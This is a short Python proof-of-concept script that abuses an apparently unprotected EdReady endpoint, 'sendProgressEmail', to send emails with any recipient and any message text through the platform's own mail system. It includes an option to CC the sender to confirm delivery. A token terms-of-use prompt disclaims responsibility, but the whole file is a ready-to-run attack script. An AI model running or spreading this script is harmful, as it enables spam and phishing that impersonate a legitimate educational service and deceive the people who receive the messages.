# Import libs
import requests
import yachalk

# API we're using
url = 'https://edready.org/ajax/assessment/sendProgressEmail'

# Ensure compliance
acceptTOS = input(yachalk.chalk.red("By using this application, you agree to not be using this for any malicious purpose. The intentions of this script is to purely showcase a POC (aka Proof Of Concept). I am not responsible for what you may do with this script. (Accept with y/n) "))
if acceptTOS != "y":
    raise Exception("You must agree to the terms of use!")


# Ask for inputs :)
email = input("Enter the email you want to send the email to: ")
mainMessage = input("Enter the main message you want to send: ")
secondMessage = input("Enter the 'second message' you want to send (will be directly under the main message): ")
# CC attacker if wanted (some might want that to ensure it was sent successfully)
cc_email = input("Do you want to be CC'd on the email? (y/n): ")

# Assert/ensure all inputs are strings, otherwise it'll throw an exception either way
assert(type(email) == str)
assert(type(mainMessage) == str)
assert(type(secondMessage) == str)
assert(type(cc_email) == str)
if cc_email == 'y':
    cc_email = True
else:
    cc_email = False
# Headers
data = {
    "goalName": "official",
    "assessmentName": "official",
    "message": mainMessage,
    "secondMessage": secondMessage,
    "emails": email,
    "email_student": cc_email
}
# Send the request
response = requests.post(url, json=data)
if response.status_code == 200:
    print(yachalk.chalk.green("Email sent successfully!"))
else:
    print(yachalk.chalk.red("Email failed to send. Are you sure you're logged into EdReady?"))
    print(yachalk.chalk.red("Status code: " + str(response.status_code)))
    print(yachalk.chalk.red("Response: " + response.text))